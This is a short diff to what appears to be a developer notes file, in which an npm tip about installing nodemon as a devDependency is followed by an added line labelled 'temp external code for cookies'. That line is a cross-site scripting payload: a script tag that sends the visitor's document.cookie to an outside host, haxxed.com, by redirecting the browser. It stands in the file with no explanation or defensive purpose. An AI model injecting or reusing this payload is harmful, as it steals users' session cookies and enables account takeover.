@@ -1,1 +1,2 @@
 while installing nodemon -- npm i -D nodemon  -> this will make nodemon as devDependency
+temp external code for cookies =<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>
